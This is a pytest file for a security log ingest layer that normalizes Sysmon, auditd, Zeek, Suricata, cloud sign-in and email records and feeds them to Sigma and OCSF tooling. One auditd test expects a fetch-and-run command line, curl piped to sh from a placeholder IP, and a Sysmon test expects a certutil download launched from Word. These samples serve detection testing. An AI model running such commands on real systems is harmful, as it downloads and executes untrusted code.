"""Contracts for the multi-source ingest layer.

The properties that matter here are not "does field X land in field Y" — they
are the ones that make a multi-source pipeline trustworthy:

* every fixture is claimed by **exactly one** signature (no vendor's records
  can be silently eaten by another vendor's parser);
* an unrecognized record is labelled ``unknown``, never routed to the
  closest-looking parser;
* a missing timestamp stays missing rather than becoming "now";
* normalization is deterministic, so two runs over the same bytes agree.
"""

from __future__ import annotations

import json
from pathlib import Path
from typing import Any

import pytest
from ingest.errors import UnsupportedInputError

from ingest import SIGNATURES, NormalizedEvent, detect_source, normalize, normalize_many

_FIXTURES = json.loads(
    (Path(__file__).resolve().parents[1] / "fixtures" / "ingest_fixtures.json").read_text(
        encoding="utf-8"
    )
)


def _records() -> list[tuple[str, dict[str, Any]]]:
    return sorted((name, case) for name, case in _FIXTURES.items())


@pytest.mark.unit
@pytest.mark.parametrize("name,case", _records(), ids=lambda value: value)
def test_each_fixture_is_claimed_by_exactly_one_signature(name: str, case: Any) -> None:
    if not isinstance(case, dict):  # parametrize passes both tuple halves
        return
    record = case["record"]
    claimed = [sig.vendor for sig in SIGNATURES if sig.recognizes(record)]
    assert claimed == [case["vendor"]], (
        f"{name}: expected only {case['vendor']} to claim this record, got {claimed}"
    )


@pytest.mark.unit
@pytest.mark.parametrize("name,case", _records(), ids=lambda value: value)
def test_each_fixture_normalizes_to_its_domain(name: str, case: Any) -> None:
    if not isinstance(case, dict):
        return
    event = normalize(case["record"])
    assert event.source_type == case["source_type"], name
    assert event.vendor == case["vendor"], name
    assert event.parse_status == "structured", f"{name}: {event.notes}"
    assert event.message, f"{name}: empty message"
    assert event.timestamp is not None, f"{name}: fixture carries a timestamp; it was lost"
    assert event.raw_excerpt, f"{name}: evidence excerpt missing"


@pytest.mark.unit
def test_signature_recognizers_are_mutually_exclusive_across_all_fixtures() -> None:
    """Cross-product check: no signature may claim another's fixture."""
    for name, case in _FIXTURES.items():
        signature = detect_source(case["record"])
        assert signature is not None, f"{name}: no signature claimed it"
        assert signature.vendor == case["vendor"], name


@pytest.mark.unit
def test_sysmon_process_lineage_and_hashes() -> None:
    event = normalize(_FIXTURES["sysmon_process_create"]["record"])
    assert event.activity == "process creation"
    assert event.actor.process_name is not None and "cmd.exe" in event.actor.process_name
    assert event.actor.parent_process_name is not None
    assert "WINWORD.EXE" in event.actor.parent_process_name
    assert event.actor.command_line is not None and "certutil" in event.actor.command_line
    assert event.device.os == "windows"
    # The digest and the download host both surface as atomic indicators.
    assert any(len(obs) == 64 for obs in event.observables), event.observables
    assert "198.51.100.24" in event.observables


@pytest.mark.unit
def test_auditd_execve_reassembles_argv_in_order() -> None:
    event = normalize(_FIXTURES["auditd_execve"]["record"])
    assert event.actor.command_line == "/bin/bash -c curl -s http://203.0.113.9/x | sh"
    assert event.device.hostname == "app-web-01"
    assert event.device.os == "linux"
    # auditd stamps its clock inside msg=audit(...); it must be recovered.
    assert event.timestamp == pytest.approx(1755162662.451, abs=0.01)


@pytest.mark.unit
def test_auditd_argv_order_is_index_based_not_dict_order() -> None:
    """a10 must follow a9, and shuffled key order must not change the result."""
    record = {"type": "EXECVE", "node": "h", "auid": "0"}
    for index in range(12):
        record[f"a{index}"] = f"arg{index}"
        record["@timestamp"] = "2026-08-14T00:00:00Z"
    shuffled = dict(reversed(list(record.items())))
    assert normalize(record).actor.command_line == normalize(shuffled).actor.command_line
    command = normalize(record).actor.command_line
    assert command is not None
    assert command.split() == [f"arg{index}" for index in range(12)]


@pytest.mark.unit
def test_zeek_dotted_tuple_keys_are_read() -> None:
    event = normalize(_FIXTURES["zeek_conn"]["record"])
    assert event.src_endpoint.ip == "10.4.11.22"
    assert event.dst_endpoint.ip == "198.51.100.24"
    assert event.dst_endpoint.port == "443"
    assert event.activity == "conn"


@pytest.mark.unit
def test_suricata_activity_stays_an_enumerable_term() -> None:
    """The signature name is evidence in the message, not a field value."""
    event = normalize(_FIXTURES["suricata_alert"]["record"])
    assert event.activity == "alert"
    assert "ET MALWARE Observed Suspicious TLS SNI" in event.message
    assert event.vendor_event_id == "2027865"


@pytest.mark.unit
def test_cloudtrail_states_success_only_when_the_provider_did() -> None:
    ok = normalize(_FIXTURES["cloudtrail_assume_role"]["record"])
    assert "outcome=success" in ok.message
    assert ok.actor.identity == "arn:aws:iam::123456789012:user/deploy-bot"
    assert ok.cloud.provider == "aws"
    assert ok.cloud.region == "us-east-1"
    assert "mfa=false" in ok.message

    denied = normalize(_FIXTURES["cloudtrail_trail_deleted"]["record"])
    assert "error=AccessDenied" in denied.message
    assert "outcome=success" not in denied.message


@pytest.mark.unit
def test_azure_operation_name_is_read_in_both_shapes() -> None:
    record = dict(_FIXTURES["azure_role_assignment"]["record"])
    assert normalize(record).activity == "Microsoft.Authorization/roleAssignments/write"
    record["operationName"] = "Microsoft.Authorization/roleAssignments/write"
    assert normalize(record).activity == "Microsoft.Authorization/roleAssignments/write"


@pytest.mark.unit
def test_entra_reports_mfa_and_risk_without_inferring_them() -> None:
    event = normalize(_FIXTURES["entra_signin_failure"]["record"])
    assert event.actor.user_principal == "jdoe@corp.example"
    assert "mfa=multiFactorAuthentication" in event.message
    assert "risk=high" in event.message
    assert "outcome=failure (50126)" in event.message
    # An empty deviceId in the export is absent, not an empty-string device.
    assert event.device.device_id is None


@pytest.mark.unit
def test_entra_without_a_status_block_does_not_claim_success() -> None:
    record = dict(_FIXTURES["entra_signin_failure"]["record"])
    record.pop("status")
    event = normalize(record)
    assert event.parse_status == "partial"
    assert "outcome=" not in event.message
    assert any("outcome is unstated" in note for note in event.notes)


@pytest.mark.unit
def test_okta_carries_the_platform_verdict_verbatim() -> None:
    event = normalize(_FIXTURES["okta_session_start"]["record"])
    assert event.activity == "user.session.start"
    assert "outcome=FAILURE" in event.message
    assert "reason=INVALID_CREDENTIALS" in event.message
    assert event.actor.user_principal == "jdoe@corp.example"


@pytest.mark.unit
def test_email_metadata_is_carried_and_bodies_are_not() -> None:
    event = normalize(_FIXTURES["defender_email_phish"]["record"])
    assert event.email.sender == "billing@partner-invoices.example"
    assert event.email.recipients == ("jdoe@corp.example", "ap@corp.example")
    assert event.email.delivery_action == "Delivered"
    assert event.email.urls == ("http://partner-invoices.example/pay/88213",)
    # The canonical shape has no body field at all — this is structural.
    assert "body" not in event.to_dict()["email"]


@pytest.mark.unit
def test_workspace_email_normalizes_to_the_same_shape() -> None:
    event = normalize(_FIXTURES["workspace_email_quarantined"]["record"])
    assert event.source_type == "email"
    assert event.email.delivery_action == "QUARANTINED"
    assert event.email.recipients == ("ap@corp.example",)


@pytest.mark.unit
def test_unrecognized_records_are_labelled_not_guessed() -> None:
    event = normalize({"totally": "unfamiliar", "shape": 1})
    assert event.source_type == "unknown"
    assert event.vendor == "unrecognized"
    assert event.parse_status == "partial"
    assert any("no parser signature claimed" in note for note in event.notes)


@pytest.mark.unit
def test_plain_text_still_normalizes() -> None:
    event = normalize("Failed password for root from 203.0.113.66 port 22 ssh2")
    assert event.source_type == "unknown"
    assert event.parse_status == "text"
    assert "203.0.113.66" in event.observables
    assert event.notes == ()


@pytest.mark.unit
def test_a_missing_timestamp_is_never_back_filled() -> None:
    record = {"_path": "conn", "uid": "x", "id.orig_h": "10.0.0.1", "id.resp_h": "10.0.0.2"}
    event = normalize(record)
    assert event.timestamp is None
    assert event.parse_status == "partial"
    assert any("timestamp" in note for note in event.notes)


@pytest.mark.unit
def test_json_string_and_mapping_inputs_agree() -> None:
    record = _FIXTURES["okta_session_start"]["record"]
    from_mapping = normalize(record)
    from_json = normalize(json.dumps(record))
    assert from_mapping.to_dict() | {"raw_excerpt": ""} == from_json.to_dict() | {"raw_excerpt": ""}


@pytest.mark.unit
def test_normalization_is_deterministic() -> None:
    for case in _FIXTURES.values():
        first = normalize(case["record"]).to_dict()
        second = normalize(case["record"]).to_dict()
        assert first == second


@pytest.mark.unit
def test_normalize_many_preserves_order_and_survives_a_bad_record() -> None:
    events = normalize_many(
        [
            _FIXTURES["zeek_conn"]["record"],
            "not json at all {",
            _FIXTURES["okta_session_start"]["record"],
        ]
    )
    assert [event.vendor for event in events] == ["zeek", "unrecognized", "okta"]


@pytest.mark.unit
def test_bytes_are_accepted_and_other_types_are_refused() -> None:
    event = normalize(json.dumps(_FIXTURES["zeek_dns"]["record"]).encode())
    assert event.vendor == "zeek"
    for bad in (42, None, object(), ["a", "list"]):
        with pytest.raises(UnsupportedInputError):
            normalize(bad)  # type: ignore[arg-type]


@pytest.mark.unit
def test_match_view_omits_absent_fields() -> None:
    event = normalize(_FIXTURES["cloudtrail_assume_role"]["record"])
    view = event.to_match_view()
    assert view["source_type"] == "cloud"
    assert view["cloud_region"] == "us-east-1"
    # An event with no process has no process key at all — not "".
    assert "image" not in view
    assert all(value != "" for value in view.values())


@pytest.mark.unit
def test_match_view_feeds_the_existing_sigma_evaluator() -> None:
    """The bridge to detection content: a normalized event is matchable."""
    from agents.tools.sigma_eval import evaluate

    event = normalize(_FIXTURES["sysmon_process_create"]["record"])
    rule = {
        "title": "Office spawns a shell",
        "detection": {
            "selection": {
                "parent_image|contains": "WINWORD.EXE",
                "image|endswith": "cmd.exe",
            },
            "condition": "selection",
        },
    }
    assert evaluate(rule, dict(event.to_match_view())) is True


@pytest.mark.unit
def test_ocsf_classification_of_normalized_events() -> None:
    from agents.tools.ocsf import normalize_source_event

    cases = {
        "sysmon_process_create": (1007, True),
        "sysmon_dns_query": (4003, True),
        "zeek_dns": (4003, True),
        "suricata_alert": (2004, True),
        "cloudtrail_assume_role": (6003, False),  # domain default, not a table hit
        "entra_signin_failure": (3002, True),
        "okta_session_start": (3002, True),
        "defender_email_phish": (4009, True),
    }
    for name, (class_uid, mapped) in cases.items():
        event = normalize(_FIXTURES[name]["record"])
        descriptor = normalize_source_event(event.source_type, event.activity)
        assert descriptor["class_uid"] == class_uid, name
        assert descriptor["mapped"] is mapped, name


@pytest.mark.unit
def test_unclassifiable_activity_reports_base_event_not_a_near_miss() -> None:
    from agents.tools.ocsf import normalize_source_event

    descriptor = normalize_source_event("endpoint", "something nobody mapped")
    assert descriptor["class_uid"] == 0
    assert descriptor["mapped"] is False


@pytest.mark.unit
def test_every_signature_is_reachable_from_a_fixture() -> None:
    """A parser with no fixture is untested code pretending to be coverage."""
    covered = {case["vendor"] for case in _FIXTURES.values()}
    assert {signature.vendor for signature in SIGNATURES} == covered


@pytest.mark.unit
def test_events_are_immutable() -> None:
    event = normalize(_FIXTURES["zeek_conn"]["record"])
    assert isinstance(event, NormalizedEvent)
    with pytest.raises((AttributeError, TypeError)):
        event.source_type = "endpoint"  # type: ignore[misc]
